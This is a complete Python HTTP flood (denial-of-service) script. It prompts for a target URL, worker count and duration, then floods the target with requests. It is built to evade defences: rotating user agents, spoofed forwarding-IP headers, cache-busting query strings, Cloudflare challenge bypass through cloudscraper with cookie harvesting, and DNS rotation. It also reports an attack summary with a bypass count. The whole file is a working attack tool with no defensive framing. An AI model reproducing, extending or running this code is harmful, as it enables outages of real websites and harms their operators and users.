import sys
import time
import random
import threading
import socket
import ssl
import json
from concurrent.futures import ThreadPoolExecutor
from cloudscraper import CloudScraper, create_scraper
from urllib3.util.ssl_ import create_urllib3_context
from urllib3 import PoolManager
import dns.resolver

class C2HTTPFlooder:
    def __init__(self, target_url, workers=200, duration=60):
        self.target_url = target_url
        self.workers = workers
        self.duration = duration
        self.running = False
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'bypassed': 0,
            'start_time': 0
        }
        self.lock = threading.Lock()
        self.domain = target_url.split('/')[2] if '//' in target_url else target_url.split('/')[0]
        
        # Enhanced fingerprint rotation
        self.user_agents = self._load_user_agents()
        self.cf_cookies = {}
        self.ip_pool = self._generate_ip_pool()
        self.dns_entries = self._resolve_dns()
        
        # SSL contexts for different cipher suites
        self.ssl_contexts = [
            self._create_ssl_context(ciphers='ECDHE-ECDSA-AES256-GCM-SHA384'),
            self._create_ssl_context(ciphers='ECDHE-RSA-AES256-GCM-SHA384'),
            self._create_ssl_context(ciphers='DHE-RSA-AES256-GCM-SHA384'),
            self._create_ssl_context(ciphers='ECDHE-RSA-CHACHA20-POLY1305')
        ]
        
        # Initialize worker sessions
        self.sessions = [self._create_session() for _ in range(workers)]
        
    def _load_user_agents(self):
        """Load and rotate user agents"""
        return [
            # Chrome Windows
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            # Chrome Mac
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            # Firefox Windows
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
            # Safari iPhone
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            # Chrome Android
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36',
            # Edge Windows
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            # Chrome Linux
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
    
    def _generate_ip_pool(self):
        """Generate spoofed X-Forwarded-For IPs"""
        return [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(1000)]
    
    def _resolve_dns(self):
        """Resolve multiple DNS entries for the domain"""
        try:
            answers = dns.resolver.resolve(self.domain, 'A')
            return [str(r) for r in answers]
        except:
            return [socket.gethostbyname(self.domain)]
    
    def _create_ssl_context(self, ciphers=None):
        """Create custom SSL contexts"""
        ctx = create_urllib3_context()
        if ciphers:
            ctx.set_ciphers(ciphers)
        return ctx
    
    def _create_session(self):
        """Create a customized session with bypass capabilities"""
        scraper = create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            },
            delay=0,
            interpreter='nodejs'
        )
        
        # Session tuning
        session = scraper
        session.verify = False
        session.trust_env = False
        session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        })
        return session
    
    def _rotate_headers(self):
        """Generate unique headers for each request"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': random.choice(self.ip_pool),
            'X-Real-IP': random.choice(self.ip_pool),
            'CF-Connecting-IP': random.choice(self.ip_pool),
            'Forwarded': f'for={random.choice(self.ip_pool)};proto=https'
        }
    
    def _get_target_variant(self):
        """Generate URL variants to bypass caching"""
        base = self.target_url.split('?')[0]
        params = {
            '_': str(int(time.time() * 1000)),
            'cache': random.randint(100000,999999),
            'ref': random.choice(['fb', 'tw', 'ig', 'in', 'yt', 'gp', 'dd', 'reddit'])
        }
        return f"{base}?{'&'.join(f'{k}={v}' for k,v in params.items())}"
    
    def _send_request(self, session, worker_id):
        """Execute a single request with bypass techniques"""
        try:
            headers = self._rotate_headers()
            target = self._get_target_variant()
            
            # Rotate DNS resolution
            if self.dns_entries:
                ip = random.choice(self.dns_entries)
                parts = self.target_url.split('/')
                parts[2] = ip
                target = '/'.join(parts)
                headers['Host'] = self.domain
            
            response = session.get(
                target,
                headers=headers,
                timeout=10,
                allow_redirects=True
            )
            
            with self.lock:
                self.stats['total'] += 1
                if response.status_code == 200:
                    self.stats['success'] += 1
                    # Extract Cloudflare cookies if present
                    if 'cf_clearance' in response.cookies:
                        self.cf_cookies['cf_clearance'] = response.cookies['cf_clearance']
                        self.stats['bypassed'] += 1
                else:
                    self.stats['failed'] += 1
            
        except Exception as e:
            with self.lock:
                self.stats['failed'] += 1
    
    def _worker(self, worker_id):
        """Worker thread that executes requests"""
        session = self.sessions[worker_id % len(self.sessions)]
        
        # Initial cookie setup
        if self.cf_cookies:
            session.cookies.update(self.cf_cookies)
        
        while self.running and time.time() - self.stats['start_time'] < self.duration:
            self._send_request(session, worker_id)
    
    def _monitor(self):
        """Display real-time statistics"""
        start = self.stats['start_time']
        while self.running and time.time() - start < self.duration:
            elapsed = time.time() - start
            rps = self.stats['total'] / elapsed if elapsed > 0 else 0
            sys.stdout.write(
                f"\r[+] Requests: {self.stats['total']} | "
                f"Success: {self.stats['success']} | "
                f"Bypassed: {self.stats['bypassed']} | "
                f"RPS: {rps:.1f} | "
                f"Elapsed: {elapsed:.1f}s/{self.duration}s"
            )
            sys.stdout.flush()
            time.sleep(0.5)
        print()
    
    def start(self):
        """Start the flood attack"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        print(f"""
   ___ ___ _____   ___ ___  _   _ ___ ___ ___ 
  / __| __|_   _| | _ \ _ \/_\ | _ \_ _/ __|
 | (__| _|  | |   |  _/  _/ _ \|  _/| |\__ \\
  \___|___| |_|   |_| |_|/_/ \_\_| |___|___/
                                             
Target: {self.target_url}
Workers: {self.workers}
Duration: {self.duration}s
        """)
        
        # Start monitor thread
        threading.Thread(target=self._monitor, daemon=True).start()
        
        # Execute workers with thread pool
        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = [executor.submit(self._worker, i) for i in range(self.workers)]
            for future in futures:
                future.result()
        
        self.running = False
        self._show_summary()
    
    def _show_summary(self):
        """Display final statistics"""
        elapsed = time.time() - self.stats['start_time']
        print(f"""
[+] Attack Summary:
    Total Duration: {elapsed:.2f}s
    Total Requests: {self.stats['total']}
    Successful: {self.stats['success']}
    Cloudflare Bypasses: {self.stats['bypassed']}
    Failed: {self.stats['failed']}
    Average RPS: {self.stats['total']/elapsed:.1f}
        """)

def get_parameters():
    """Get user input for attack parameters"""
    print("""
   ___ ___ _____   ___ ___  _   _ ___ ___ ___ 
  / __| __|_   _| | _ \ _ \/_\ | _ \_ _/ __|
 | (__| _|  | |   |  _/  _/ _ \|  _/| |\__ \\
  \___|___| |_|   |_| |_|/_/ \_\_| |___|___/
    """)
    
    target = input("[?] Enter target URL (with http/https): ").strip()
    if not target.startswith(('http://', 'https://')):
        print("[!] Invalid URL - must include protocol")
        sys.exit(1)
    
    try:
        workers = int(input("[?] Enter number of workers (50-1000): "))
        if workers < 50 or workers > 1000:
            print("[!] Workers must be between 50-1000")
            sys.exit(1)
    except ValueError:
        print("[!] Invalid number")
        sys.exit(1)
    
    try:
        duration = int(input("[?] Enter attack duration in seconds (10-3600): "))
        if duration < 10 or duration > 3600:
            print("[!] Duration must be between 10-3600 seconds")
            sys.exit(1)
    except ValueError:
        print("[!] Invalid number")
        sys.exit(1)
    
    return target, workers, duration

if __name__ == "__main__":
    target, workers, duration = get_parameters()
    flooder = C2HTTPFlooder(target, workers, duration)
    
    try:
        flooder.start()
    except KeyboardInterrupt:
        flooder.running = False
        print("\n[!] Attack stopped by user")
        flooder._show_summary()
